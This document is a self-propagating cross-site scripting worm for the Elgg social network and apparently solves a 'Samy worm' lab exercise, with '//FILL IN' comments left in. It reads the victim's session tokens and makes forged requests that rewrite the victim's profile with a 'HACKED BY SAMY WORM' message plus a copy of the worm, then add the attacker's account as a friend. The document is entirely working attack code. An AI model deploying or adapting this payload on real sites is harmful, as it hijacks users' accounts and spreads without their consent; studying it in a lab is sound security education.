<script id="worm">
    window.onload = function() {
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
        // Add Samy as friend and change the Description profile field
        var userName="&name="+elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the content of your url.
        //var about_me = "YOU HAVE BEEN HACKED BY SAMY WORM! :)+\n"+wormCode
        //Propagate the xss attack to other users
        var samyGuid="59"; //FILL IN
        var about_me = "<p>YOU HAVE BEEN HACKED BY SAMY WORM! :)</p>"
        var sendurl="/action/profile/edit"; //FILL IN
        var content=token+ts+guid+userName+"&description="+about_me+wormCode; //FILL IN
        if(elgg.session.user.guid != samyGuid) { // (1)
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(content);
            //Construct the HTTP request to add Samy as a friend.
            sendurl="/action/friends/add?friend="+samyGuid+ts+token+ts+token; //FILL IN
            //Create and send Ajax request to add friend
            Ajax=new XMLHttpRequest();
            Ajax.open("GET", sendurl, true);
            Ajax.send();
        }
    }
</script>